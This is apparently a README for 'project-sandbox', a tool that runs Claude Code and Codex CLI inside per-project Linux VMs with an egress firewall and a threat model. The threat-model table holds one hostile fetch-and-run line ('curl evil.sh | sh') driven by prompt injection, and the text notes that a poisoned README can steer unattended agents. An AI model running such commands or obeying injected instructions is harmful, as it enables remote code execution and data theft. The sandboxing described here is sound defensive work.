# project-sandbox

`project-sandbox` runs Claude Code and Codex CLI inside per-project Linux containers managed by Apple's [`container`](https://github.com/apple/container) runtime. Each container runs in its own VM with hardware-enforced isolation, so the box itself is the security boundary — the agents are configured to operate freely inside it.

The tool generates a derived image, sanitized agent configs, an egress firewall, launcher scripts, and a parallel devcontainer specification so the same sandbox is reachable from VS Code, Cursor, JetBrains Gateway, GitHub Codespaces, or any Docker-compatible devcontainer client.

## What it does end-to-end

Given `project-sandbox /path/to/repo python:3.12-slim`:

1. Verify the `container` system service is running.
2. Read host `git config --global` identity.
3. Render `<project>/.project-sandbox/` — `Dockerfile`, `entrypoint.sh`, `init-firewall.sh`, sanitized `claude/settings.json` and `codex/config.toml`, a devcontainer post-start init script, and a per-project `.gitignore` that whitelists the assets meant to be committed.
4. Build the image with `container build`.
5. Render `<project>/.devcontainer/` with symlinks back into `.project-sandbox/` so the Dockerfile and firewall script remain a single source of truth.
6. Generate `<project>/.project-sandbox/bin/run-claude` and `run-codex` launchers that invoke `container run` with `NET_ADMIN`/`NET_RAW` capabilities, the right bind mounts, and the host git identity threaded through environment variables.
7. The container entrypoint wires git identity, copies credentials from the read-only host mount into the container's home, then runs the firewall before exec'ing the agent.
8. Append agent-secret paths to `<project>/.gitignore` (idempotent).

## Install

From a published package:

```bash
uvx project-sandbox --help
```

From a checkout:

```bash
uv sync
uv run project-sandbox --help
```

## Quick start

```bash
uv run project-sandbox --agent both /absolute/path/to/repo python:3.12-slim
```

Use `--dry-run` to preview every action without writing files or starting the runtime:

```bash
uv run project-sandbox --dry-run --agent both /absolute/path/to/repo python:3.12-slim
```

## File layout

```
<project>/
├── .gitignore                       # appended (idempotent): credential paths
├── .project-sandbox/
│   ├── .gitignore                   # whitelist of committed assets
│   ├── Dockerfile                   # generated, committed
│   ├── entrypoint.sh                # container PID 1
│   ├── init-firewall.sh             # iptables/ipset egress allowlist
│   ├── project-sandbox-devcontainer-init  # devcontainer postStart helper
│   ├── claude/settings.json         # sanitized Claude config (committed)
│   ├── codex/config.toml            # sanitized Codex config (committed)
│   ├── bin/run-claude               # launcher → container run
│   ├── bin/run-codex                # launcher → container run
│   └── sessions/                    # unsupervised-mode logs (gitignored)
└── .devcontainer/
    ├── devcontainer.json            # generated
    ├── Dockerfile          → ../.project-sandbox/Dockerfile
    ├── init-firewall.sh    → ../.project-sandbox/init-firewall.sh
    ├── claude              → ../.project-sandbox/claude
    └── codex               → ../.project-sandbox/codex
```

The Dockerfile, both sanitized configs, and `init-firewall.sh` are intended to be committed so the team gets a consistent dev environment from `git clone`. Credential files are not.

## Devcontainer flow

Open the project in VS Code, Cursor, or any devcontainer-aware IDE and choose **Reopen in Container**. The generated `devcontainer.json` builds the same image, mounts the same sanitized configs, runs the same firewall via `postStartCommand`, and waits for it before opening a terminal.

Generate the devcontainer without building or running anything:

```bash
uv run project-sandbox /absolute/path/to/repo python:3.12-slim
```

This is useful for repos whose owners do not have `apple/container` installed but want the sandboxed agent environment for IDE or Codespaces use.

## Unsupervised (fire-and-forget) sessions

Run the agent without a TTY, starting from a prompt and writing all output to a log file:

```bash
uv run project-sandbox \
  --agent claude \
  --prompt /absolute/path/to/prompt.txt \
  /absolute/path/to/repo \
  python:3.12-slim
```

- `--prompt FILE` bind-mounts the file at `/workspace/.project-sandbox-prompt`.
- `--prompt-text "…"` passes the prompt via env var (or via a temp file if longer than 4096 chars).
- `--log FILE` overrides the default log path under `.project-sandbox/sessions/<agent>-main-<timestamp>.log`.
- `--timeout SECONDS` kills the container if the agent runs too long; the launcher returns exit code `124` on timeout.
- The agent's exit code is propagated, so CI pipelines can detect failures.

Unsupervised sessions implicitly skip the interactive `-it` flags, switch the dispatch to `claude-headless` / `codex-headless`, and run with `--dangerously-skip-permissions` (Claude) or `approval_policy = "never"` (Codex). The container is still the sandbox boundary; review the diff before integrating.

A maliciously crafted file in the workspace (e.g. a prompt-injection in a README) can still steer an unsupervised agent. Use narrow prompts and inspect the diff before merging.

## Network firewall

When the firewall is enabled (default), `init-firewall.sh` runs as root inside the container and:

- Sets `iptables` and `ip6tables` policies to DROP.
- Pins DNS to the resolver(s) in `/etc/resolv.conf` only (closes the DNS-tunnel exfiltration gap in the upstream Anthropic devcontainer).
- Allows GitHub's published IP ranges (fetched from `api.github.com/meta`), `registry.npmjs.org`, `api.anthropic.com`, `api.openai.com`, and sentry.
- Allows the host gateway subnet so port-forwarding and IDE attach work.
- Mirrors the IPv4 allowlist into a parallel IPv6 set; falls back to disabling IPv6 via `sysctl` when `ip6_tables` is unavailable. `--no-ipv6-firewall` accepts that fallback even when `sysctl` also fails (use sparingly).

Customize:

- `--extra-domain DOMAIN` — append entries to the allowlist (private npm registries, internal APIs, etc.). Repeatable.
- `--firewall-allow-openai` — explicitly allow `api.openai.com` even when Codex is not installed.
- `--no-firewall` — skip the firewall entirely (trusted-LAN debugging only).

## Threat model

| Threat | Mitigation |
|---|---|
| Agent reads `~/.ssh`, `~/Library`, etc. | VM boundary (`apple/container` `Virtualization.framework`); only `/workspace` is mounted. |
| Agent deletes the wrong project directory | Only the project path is mounted; everything else lives in the disposable VM. |
| Agent exfiltrates the workspace to an arbitrary server | iptables egress allowlist (default DROP + domain whitelist) for both IPv4 and IPv6. |
| DNS tunneling exfiltration | DNS restricted to the in-VM resolver only. |
| Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
| Malicious npm post-install scripts | Run as UID 1000 inside the VM; no host access. |
| Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` (Claude) and `disable_update_check = true` (Codex). |
| API token leakage to other host processes | The token lives inside the VM, not in the macOS Keychain. |

The tool does **not** protect against:

- Exfiltration via whitelisted endpoints (e.g. committing secrets to a GitHub repo).
- Misuse of an agent's own API token (it is by definition available to the agent).
- IPv6 egress when `ip6_tables` is unavailable, `sysctl` cannot disable IPv6, **and** `--no-ipv6-firewall` is set.

## Troubleshooting

- **`container system start` failed.** Make sure macOS 15+ is current and `apple/container` is installed; the tool calls `container system start` idempotently before building.
- **Build OOM.** The builder VM is separate from run VMs. Bump it: `container builder start --memory 8g --cpus 8`, then re-run with `--rebuild`.
- **GitHub meta API timeout.** The firewall script falls back to an empty `{web,api,git,ipv6}` set and starts with a partial allowlist. Re-running the agent later (with the firewall flushed and rebuilt at container start) will retry.
- **`ip6tables` unavailable.** The script attempts `sysctl net.ipv6.conf.all.disable_ipv6=1` first. If that fails too, the script aborts unless `--no-ipv6-firewall` is set.
- **Credentials look stale.** With `--credentials-mode ro`, refresh tokens cannot be written back; use the default `rw` for long-running setups.
- **Env vars in `vminitd.log`.** apple/container [logs the full process environment](https://github.com/apple/container/discussions/1153). Tokens are passed through mounted credential files only; identity env vars are low-sensitivity.

## Limitations

- Base images must be Debian or Ubuntu based — the firewall depends on `apt` packages including `aggregate`, which Alpine does not ship.
- Apple `container` is required to run the launchers. The generated `.devcontainer/` works with any Docker-compatible runtime (Docker Desktop, OrbStack, Codespaces).
- `--branch` (worktree mode) is reserved for a future release. The CLI accepts the flag and exits with an explanation; the same workflow can be approximated today by running the tool against an externally-managed worktree path.
- `jj` is installed in the container for users who want to shell in and use it, but the tool itself does not write any jj configuration. Configure jj inside the container yourself if you need it.

## Development

```bash
uv sync
uv run python -m compileall src tests
uv run pytest -q
```

Tests cover CLI surface, dry-run non-mutation, renderer output, launcher shell quoting, container `argv` construction, devcontainer JSON validity and symlinks, gitignore helpers, and Python-native unsupervised-session timeout handling.

A self-contained end-to-end smoke test creates a throwaway hello-world project, runs the tool against it, and validates every generated artefact:

```bash
./scripts/e2e-test.sh                  # portable: devcontainer only path
./scripts/e2e-test.sh --with-container # also exercises launcher generation (requires apple/container)
```

The test prints the temp project path on success so the generated files can be inspected.

The full original design lives in [`docs/PLAN.md`](docs/PLAN.md).

## References

 - [agentbox](https://github.com/fletchgqc/agentbox/tree/main)
 - [Claude Code devcontainer](https://github.com/anthropics/claude-code/tree/main/.devcontainer)
 - [Jarek Hartman: Codex in the jail](https://jhartman.pl/posts/macos/2026-02-02-codex-in-the-jail/)
